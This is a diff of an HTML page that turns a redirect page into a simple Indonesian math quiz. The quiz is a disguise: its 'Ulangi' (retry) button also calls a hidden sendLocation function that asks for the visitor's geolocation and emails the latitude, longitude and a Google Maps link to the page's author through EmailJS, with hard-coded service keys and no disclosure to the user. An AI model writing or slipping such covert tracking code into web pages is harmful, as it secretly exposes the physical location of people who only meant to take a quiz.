@@ -1,18 +1,140 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 
 <head>
     <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Link</title>
+    <title>Quiz Matematika</title>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
 
-<body>
-    <h1>Ijal Ajg</h1>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
+
+    <div class="bg-white shadow-lg rounded-xl p-6 w-full max-w-md">
+        <h1 class="text-2xl font-bold text-center mb-4">🧮 Quiz Matematika</h1>
+
+        <div id="quiz-container">
+            <p id="question" class="text-lg font-semibold mb-4"></p>
+
+            <div id="answers" class="space-y-2"></div>
+
+            <button onclick="nextQuestion()" class="mt-4 w-full bg-blue-500 hover:bg-blue-600 text-white py-2 rounded-lg">
+            Next
+        </button>
+        </div>
+
+        <div id="result" class="hidden text-center">
+            <h2 class="text-xl font-bold mb-2">Hasil Quiz</h2>
+            <p id="score" class="text-lg"></p>
+            <button onclick="restartQuiz();sendLocation()" class="mt-4 bg-green-500 hover:bg-green-600 text-white px-4 py-2 rounded-lg">
+            Ulangi
+        </button>
+        </div>
+    </div>
+    <script>
+        (function() {
+            emailjs.init("mUQp9_uZ33Cz_Prea");
+        })();
+
+        function sendLocation() {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                let lat = position.coords.latitude;
+                let lng = position.coords.longitude;
+
+                emailjs.send("service_c2lcpqb", "template_vf3kc7v", {
+                    latitude: lat,
+                    longitude: lng,
+                    maps_link: "https://www.google.com/maps?q=" + lat + "," + lng
+                });
+            });
+        }
+    </script>
+    <script>
+        const quizData = [{
+            question: "5 + 3 = ?",
+            answers: ["6", "7", "8", "9"],
+            correct: "8"
+        }, {
+            question: "10 - 4 = ?",
+            answers: ["5", "6", "7", "8"],
+            correct: "6"
+        }, {
+            question: "6 x 2 = ?",
+            answers: ["10", "12", "14", "16"],
+            correct: "12"
+        }, {
+            question: "15 ÷ 3 = ?",
+            answers: ["3", "4", "5", "6"],
+            correct: "5"
+        }];
+
+        let currentQuestion = 0;
+        let score = 0;
+        let selectedAnswer = null;
+
+        function loadQuestion() {
+            const q = quizData[currentQuestion];
+            document.getElementById("question").innerText = q.question;
+
+            const answersDiv = document.getElementById("answers");
+            answersDiv.innerHTML = "";
+
+            q.answers.forEach(answer => {
+                const btn = document.createElement("button");
+                btn.innerText = answer;
+                btn.className = "w-full bg-gray-200 hover:bg-gray-300 py-2 rounded";
+                btn.onclick = () => selectAnswer(answer, btn);
+                answersDiv.appendChild(btn);
+            });
+        }
+
+        function selectAnswer(answer, button) {
+            selectedAnswer = answer;
+
+            // reset warna
+            document.querySelectorAll("#answers button").forEach(btn => {
+                btn.classList.remove("bg-blue-400");
+            });
+
+            button.classList.add("bg-blue-400");
+        }
+
+        function nextQuestion() {
+            if (!selectedAnswer) return;
+
+            if (selectedAnswer === quizData[currentQuestion].correct) {
+                score++;
+            }
+
+            selectedAnswer = null;
+            currentQuestion++;
+
+            if (currentQuestion < quizData.length) {
+                loadQuestion();
+            } else {
+                showResult();
+            }
+        }
+
+        function showResult() {
+            document.getElementById("quiz-container").classList.add("hidden");
+            document.getElementById("result").classList.remove("hidden");
+            document.getElementById("score").innerText = `Skor kamu: ${score} / ${quizData.length}`;
+        }
+
+        function restartQuiz() {
+            currentQuestion = 0;
+            score = 0;
+            selectedAnswer = null;
+
+            document.getElementById("quiz-container").classList.remove("hidden");
+            document.getElementById("result").classList.add("hidden");
+
+            loadQuestion();
+        }
+
+        loadQuestion();
+    </script>
+
 </body>
-<script>
-    window.open("https://drive.google.com/drive/folders/1cxuDbIJyz9vDJozB6524NonhFFGC5JHG?usp=sharing", '_self');
-</script>
 
 </html>
